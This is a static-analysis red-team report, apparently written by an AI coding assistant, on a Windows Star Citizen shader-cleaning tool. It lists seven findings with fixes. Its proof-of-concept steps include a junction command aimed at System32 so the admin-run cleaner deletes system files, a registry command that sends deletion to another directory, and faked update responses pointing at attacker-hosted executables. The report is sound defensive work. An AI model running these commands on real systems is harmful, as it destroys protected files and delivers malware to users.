# Red Team Assessment: Star Citizen Performance Tool v2.0.0

**Date**: 2026-04-08
**Scope**: `nuke_shaders_gui.py` — static source analysis, all attack surfaces
**Duration**: Single session, passive analysis only (no live exploitation)
**Assessor**: Claude Code — Red Team Skill

---

## Executive Summary

**Overall Risk**: HIGH

A Windows desktop utility that self-elevates to admin, then performs file deletion, process termination, and DNS operations. The tool trusts `%LOCALAPPDATA%` contents at face value: any directory planted under `star citizen\` — including Windows directory junction points — is offered to the user as a shader cache to clean. Because the tool runs as administrator and the victim directory is writable by non-admin users, a low-privilege process can pre-position a junction before the user runs the tool, resulting in arbitrary file deletion with admin rights. A secondary network-level attack (MitM on the update check) can redirect users to malicious download sites. If neither finding is remediated, a local attacker can escalate from user-level access to corrupting or removing protected system files.

### Severity Distribution

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 1 |
| Medium   | 2 |
| Low      | 2 |
| Info     | 2 |

### Top 3 Findings

1. **[F-001]** Directory junction in `%LOCALAPPDATA%\star citizen\` causes admin-level arbitrary file deletion
2. **[F-002]** `release_url` from GitHub API passed to `webbrowser.open()` without scheme validation
3. **[F-003]** NVIDIA cache path read from registry without validation — attacker-controllable deletion target

---

## Attack Chains

### Chain A: Low-Priv User → Admin File Deletion via Junction Pre-positioning

**Aggregate Severity**: HIGH

1. **[F-001, step 1]** — Non-admin attacker (or malicious process in user session) calls `mklink /J "%LOCALAPPDATA%\star citizen\starcitizen_live" "C:\Windows\System32"` before the tool runs
2. **[F-001, step 2]** — Tool starts, scans `%LOCALAPPDATA%\star citizen\`, reports `starcitizen_live` as an existing shader cache with non-zero size
3. **[F-001, step 3]** — User proceeds to Cleaning step; `starcitizen_live` appears pre-ticked (size > 0)
4. **[F-001, step 4]** — User clicks "Run Cleaning"; `clear_folder` calls `os.walk(junction_path)`, traverses `System32`, unlinks files as administrator

**Impact**: Deletion of arbitrary protected files — including kernel DLLs, driver files, or security components — without any admin credential prompt beyond the tool's own UAC elevation.
**Likelihood**: Moderate. Requires the attacker to have user-session access before the tool runs. Achievable by malware already running as the current user, or a persistent scheduled task.

---

### Chain B: Network MitM → Malicious Browser Launch

**Aggregate Severity**: MEDIUM-HIGH

1. **[F-002, step 1]** — Attacker intercepts HTTPS response from `api.github.com` (ARP spoofing on local network, compromised router, DNS poisoning, or rogue proxy)
2. **[F-002, step 2]** — Serves `{"tag_name": "99.0.0", "html_url": "https://attacker.com/SC-Updater.exe"}` (or any URI)
3. **[F-002, step 3]** — Tool displays "v2.0.0 → v99.0.0 available" in the nav bar
4. **[F-002, step 4]** — User clicks the update link; `webbrowser.open("https://attacker.com/SC-Updater.exe")` executes
5. **[F-002, step 5]** — User downloads and runs the "update" — malware executes in their session

**Impact**: Arbitrary code execution via social engineering amplified by the tool's trusted UI.
**Likelihood**: Low-Medium. Requires network position, but public Wi-Fi or home router compromise is realistic.

---

## Findings

### [F-001] Directory Junction Pre-positioning → Privileged File Deletion

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Surface** | injection |
| **Location** | `nuke_shaders_gui.py:171-193` (`_scan_sc_shaders`), `:390-441` (`clear_folder`) |
| **CWE** | CWE-61 — UNIX Symbolic Link Following; CWE-732 — Incorrect Permission Assignment |
| **CVSS** | ~7.8 (Local, Low Complexity, Low Privileges Required, No User Interaction beyond tool use) |

**Description**

`_scan_sc_shaders` iterates every subdirectory of `%LOCALAPPDATA%\star citizen\` and returns them all as candidate shader caches. The tool runs as administrator. `%LOCALAPPDATA%\star citizen\` is writable by the current (non-admin) user. `os.walk` follows Windows directory junction points (reparse points), which are indistinguishable from real directories in the resulting listing.

**Proof of Concept**

```
# As non-admin attacker (same user session, or any process running as that user):
mkdir "%LOCALAPPDATA%\star citizen" 2>nul
mklink /J "%LOCALAPPDATA%\star citizen\starcitizen_live" "C:\Windows\System32"

# Tool runs (as admin), scans star citizen\, reports:
#   starcitizen_live    [size of System32]   WARNING
#
# clear_folder() is called with the junction path:
for root, dirs, files in os.walk(junction_target):   # traverses System32
    fp.unlink()                                        # deletes as ADMIN
```

**Impact**

Deletion of any files accessible to the administrator account — including System32 DLLs, driver files, security components, or user data outside the normal non-admin write scope. Can be used to cause a blue screen, break Windows Update, disable antivirus, or corrupt boot-critical components.

**Remediation**

Validate that each discovered path under `star citizen\` is a real directory, not a reparse point, before presenting or cleaning it. Use `os.stat` with `os.lstat` comparison or check the reparse attribute:

```python
# In _scan_sc_shaders, replace the inner block:
for entry in sc_base.iterdir():
    if entry.is_dir() and not entry.is_symlink():
        # Also check for reparse points (junctions) on Windows
        import stat as _stat
        try:
            st = entry.stat()
            # FILE_ATTRIBUTE_REPARSE_POINT = 0x400
            if hasattr(st, 'st_file_attributes') and (st.st_file_attributes & 0x400):
                continue  # skip junction/symlink
        except OSError:
            continue
        results.append((entry.name, entry, self._get_folder_size(entry)))
```

Apply the same reparse-point check in `clear_folder` before walking:

```python
@staticmethod
def clear_folder(path: Path, recreate: bool = True) -> tuple[bool, str]:
    if not path.exists():
        return False, "Not found"
    # Refuse to operate on junctions or symlinks
    try:
        st = path.stat()
        if hasattr(st, 'st_file_attributes') and (st.st_file_attributes & 0x400):
            return False, "Path is a reparse point — skipped for safety"
    except OSError:
        return False, "Stat failed"
    if path.is_symlink():
        return False, "Path is a symlink — skipped for safety"
    ...
```

**References**

- [CWE-61: UNIX Symbolic Link (Symlink) Following](https://cwe.mitre.org/data/definitions/61.html)
- [MSDN: CreateSymbolicLink / Junction Points](https://learn.microsoft.com/en-us/windows/win32/fileio/reparse-points)

---

### [F-002] Unvalidated Remote URL Passed to `webbrowser.open()`

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Surface** | injection |
| **Location** | `nuke_shaders_gui.py:1636-1650` (`_check_for_updates`, `_show_update`) |
| **CWE** | CWE-601 — URL Redirection to Untrusted Site |
| **CVSS** | ~5.3 (Network, High Complexity, No Privileges Required) |

**Description**

`release_url` is taken directly from `data.get("html_url", "")` in the GitHub API response and passed to `webbrowser.open(url)` without any validation. If an attacker can influence this response (MitM, DNS poisoning, compromised router), they can inject an arbitrary URI. On Windows, `webbrowser.open()` delegates to `ShellExecuteW`, which honours all registered URI handlers — including `file://`, `ms-shell:`, and any application-registered scheme.

**Proof of Concept**

```python
# Attacker-controlled API response:
{
  "tag_name": "99.0.0",
  "html_url": "https://evil.example.com/StarCitizen-v99-update.exe"
}

# Tool renders: "v2.0.0 → v99.0.0 available" (clickable)
# User clicks → webbrowser.open("https://evil.example.com/...") 
# Browser navigates to attacker-controlled download page
```

An `ms-shell:` or `file:///` URI could also directly launch a binary on the local filesystem depending on system URI handler configuration.

**Impact**

Phishing page delivery or direct execution of a local binary when the user clicks the update notification. Because the tool runs as admin, any subsequent user-initiated file (e.g., "save and run this update") executes at elevated privilege.

**Remediation**

Validate `release_url` before binding it to the click handler:

```python
from urllib.parse import urlparse

def _show_update(self, latest: str, url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in ("https", "http") or not parsed.netloc:
        return  # reject non-HTTP(S) or empty URLs
    # Optionally restrict to github.com:
    if not parsed.netloc.endswith("github.com"):
        return
    self.ver_lbl.configure(
        text=f"v{VERSION} → v{latest} available",
        foreground="purple",
        cursor="hand2",
    )
    self.ver_lbl.bind("<Button-1>", lambda e: webbrowser.open(url))
```

**References**

- [CWE-601: URL Redirection to Untrusted Site ('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)
- [OWASP: Unvalidated Redirects and Forwards](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect)

---

### [F-003] Registry-Controlled File Path Used as Deletion Target Without Validation

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Surface** | config |
| **Location** | `nuke_shaders_gui.py:348-358` (`_get_nvidia_cache_from_registry`) |
| **CWE** | CWE-73 — External Control of File Name or Path |
| **CVSS** | ~4.4 (Local, Low Complexity, High Privileges Required to pre-position) |

**Description**

`HKLM\SOFTWARE\NVIDIA Corporation\Global\NVCache\NVCachePath` is read and used directly as the NVIDIA cache deletion target with no path validation. An administrator who pre-sets this value to a sensitive directory (e.g., `C:\Windows\System32`, `C:\Users`, or a UNC path `\\attacker\share`) causes the cleaner to scan and delete files from that location. While modifying `HKLM` requires admin rights, a compromised admin account, a malicious setup script, or a pre-install tamper during system provisioning could plant the value before the tool is run by another admin.

**Proof of Concept**

```
# As admin attacker (pre-positioned):
reg add "HKLM\SOFTWARE\NVIDIA Corporation\Global\NVCache" /v NVCachePath /t REG_SZ /d "C:\SensitiveData" /f

# Tool runs later (as a different admin user):
# _get_nvidia_cache_from_registry() returns Path("C:\SensitiveData")
# "NV_Cache" entry presented in Cleaning step
# User cleans it → SensitiveData contents deleted
```

**Impact**

Arbitrary file deletion from any path an admin pre-configures. Also allows scanning of network shares (`\\server\share\`) via UNC paths, potentially revealing folder structure to an attacker-controlled SMB server.

**Remediation**

Validate the registry-returned path against expected base locations before use:

```python
def _get_nvidia_cache_from_registry(self) -> Path | None:
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\NVIDIA Corporation\Global\NVCache",
        )
        value, _ = winreg.QueryValueEx(key, "NVCachePath")
        winreg.CloseKey(key)
    except OSError:
        return None

    path = Path(value)
    # Reject UNC paths, paths outside ProgramData, and non-absolute paths
    if not path.is_absolute() or str(path).startswith("\\\\"):
        return None
    allowed_roots = (self.program_data, self.local_appdata)
    if not any(path.is_relative_to(root) for root in allowed_roots):
        return None
    return path
```

**References**

- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)

---

### [F-004] Process Termination by Name (Not PID) — TOCTOU

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Surface** | config |
| **Location** | `nuke_shaders_gui.py:444-456` (`kill_process`), `:1303-1313` (`_cleaning_worker`) |
| **CWE** | CWE-367 — Time-of-check Time-of-use (TOCTOU) Race Condition |
| **CVSS** | ~2.5 |

**Description**

PIDs are captured during the analysis scan but are never used when killing processes. `taskkill /F /IM <exe_name>` terminates **all** processes with that name. Between scan time and clean time, the legitimate process may have exited and a different process with the same EXE name may have started (e.g., a new RSI Launcher session, or a service). All matching instances are killed without discrimination.

**Impact**

Unintended termination of processes that were not running at scan time. Low real-world impact for this tool's named targets, but worth noting for correctness and robustness.

**Remediation**

Pass the PID captured at scan time to `taskkill /PID`:

```python
@staticmethod
def kill_process(exe_name: str, pid: int | None = None) -> tuple[bool, str]:
    if pid is not None:
        args = ["taskkill", "/F", "/PID", str(pid)]
    else:
        args = ["taskkill", "/F", "/IM", exe_name]
    ...
```

Update callers to pass the PID from `sc_procs[exe][1]`.

---

### [F-005] Silent Exception Swallowing in Update Check

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Surface** | config |
| **Location** | `nuke_shaders_gui.py:1631-1642` (`_check_for_updates`) |
| **CWE** | CWE-390 — Detection of Error Condition Without Action |

**Description**

The update check wraps the entire network and parsing operation in `except Exception: pass`. Any exception — including a `json.JSONDecodeError` from a malformed response, a `ValueError` from unexpected data types, or an `ssl.SSLError` from a certificate issue — is silently discarded. This prevents detection of active MitM attempts that corrupt the response, and makes debugging any update check failure impossible.

**Proof of Concept**

```python
# Attacker serves malformed JSON (attempting response probing):
b"THIS IS NOT JSON"
# Tool: except Exception: pass  → no log, no alert, invisible to user and developer
```

**Impact**

MitM response injection failures are undetectable. Certificate errors (expired cert, self-signed cert intercepting traffic) are silently ignored. Defender loses visibility into network-level anomalies.

**Remediation**

Log specific expected failures; let unexpected ones surface:

```python
def _check_for_updates(self) -> None:
    import logging
    try:
        url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
        req = urllib.request.Request(url, headers={"User-Agent": "SCPerfTool"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode())
            latest = data.get("tag_name", "").lstrip("v")
            release_url = data.get("html_url", "")
            if latest and self._version_compare(latest, VERSION) > 0:
                self.root.after(0, lambda: self._show_update(latest, release_url))
    except (urllib.error.URLError, TimeoutError):
        pass  # Network unavailable — expected, silent
    except (json.JSONDecodeError, KeyError, ValueError):
        logging.warning("Update check: unexpected response format")
```

---

### [F-006] No Certificate Pinning on Update Check

| Field | Value |
|-------|-------|
| **Severity** | INFO |
| **Surface** | config |
| **Location** | `nuke_shaders_gui.py:1633-1636` |
| **CWE** | CWE-295 — Improper Certificate Validation |

**Description**

Standard OS TLS validation is used for the GitHub API update check. Any certificate trusted by the Windows certificate store — including enterprise CA roots or government-issued certificates — can intercept the connection without triggering an error. Certificate pinning would prevent this.

**Impact**

Low in most environments. Relevant in corporate networks where TLS inspection proxies are deployed, or in environments where rogue CAs have been installed.

**Remediation**

For a tool of this scope, adding full certificate pinning is disproportionate. A reasonable middle ground is verifying the host explicitly:

```python
import ssl
ctx = ssl.create_default_context()
# Optionally: ctx.load_verify_locations(cafile=bundled_cacert)
with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
    ...
```

---

### [F-007] User-Agent Discloses Tool Identity to Network Observers

| Field | Value |
|-------|-------|
| **Severity** | INFO |
| **Surface** | data |
| **Location** | `nuke_shaders_gui.py:1634` |
| **CWE** | CWE-200 — Exposure of Sensitive Information |

**Description**

The outbound update request uses `User-Agent: SCPerfTool`. Network observers (ISP, corporate proxy, local network tap) can identify that this user is running the Star Citizen Performance Tool, including approximate timing and frequency of use.

**Impact**

Minimal. Useful for targeted phishing ("We noticed you use SC Performance Tool — download our update") but not directly exploitable.

**Remediation**

Use a generic or versioned user-agent if privacy is a concern: `f"SCPerfTool/{VERSION}"` is already somewhat specific; switching to a generic browser UA would obscure the tool.

---

## Defenses Confirmed

| Defense | What It Prevented |
|---------|-------------------|
| All subprocess calls use list form (not shell=True) | Shell injection via process names or arguments |
| Process kill target names are hardcoded constants | Attacker-controlled process names reaching `taskkill` |
| `tasklist` output parsing does not eval or exec results | Code injection via crafted process names |
| UAC elevation guard in `main()` | Accidental non-admin execution |
| `cleaning_running` flag blocks concurrent re-scan | Data race on `self.report` during cleaning |
| `MoveFileExW` used for locked files instead of retry loops | Hung cleaning operations |
| `_version_compare` uses pure integer comparison | ReDoS or injection via malformed version strings |
| `winreg.KEY_WOW64_64KEY` flag on HAGS key read | Registry redirection bypass on 32-bit Python |
| `path.is_relative_to` not used for cleaning boundary | *(not present — see F-001)* |

---

## Gaps and Limitations

- **No live execution performed** — all findings are from static analysis; dynamic testing would be required to confirm exploitability on a real machine
- **PyInstaller bundle not analyzed** — bundled dependencies and their versions could introduce additional CVEs; `pip audit` on the build environment is recommended
- **No network capture** — the update check TLS behaviour (certificate validation strictness) was inferred from Python's `urllib` defaults, not observed
- **Registry write testing not performed** — F-003 exploitability assumes standard HKLM write restrictions are in place

---

## Prioritized Recommendations

| Priority | Finding | Effort | Action |
|----------|---------|--------|--------|
| 1 | F-001 | Low | Add reparse-point check in `_scan_sc_shaders` and `clear_folder` |
| 2 | F-002 | Low | Validate `release_url` scheme and host before `webbrowser.open()` |
| 3 | F-003 | Low | Validate registry-returned path against allowed root directories |
| 4 | F-005 | Low | Replace `except Exception: pass` with specific exception handling |
| 5 | F-004 | Low | Pass PID to `taskkill /PID` instead of `/IM` |
| 6 | F-006 | Med | Evaluate whether TLS pinning is warranted for the deployment context |
| 7 | F-007 | Trivial | No action required unless user privacy is a stated requirement |

---

## Methodology

Static source code analysis following the kill chain: Recon → Enumerate → Exploit → Escalate → Report. No live execution or network requests were made. All findings are derived from reading `nuke_shaders_gui.py` and reasoning about Windows platform behaviour.

### Surfaces Tested

| Surface | Tested | Notes |
|---------|--------|-------|
| injection | Yes | subprocess, ctypes, registry, file system |
| secrets | Yes | No hardcoded credentials found |
| config | Yes | Registry paths, env vars, update URL |
| dependencies | Partial | Only stdlib + tkinter — no `pip audit` run |
| infrastructure | N/A | Local desktop tool |
| data | Yes | Update check, process output |
| api | Yes | GitHub API response handling |
| auth | N/A | No authentication in the tool |

### Phases

| Phase | Focus |
|-------|-------|
| Recon | Tech stack, entry points, data flow, privilege model |
| Enumeration | Every subprocess call, registry read, file system operation, network call |
| Exploitation | Junction pre-positioning chain, MitM update injection chain |
| Reporting | Findings written, chains mapped, remediations specified |
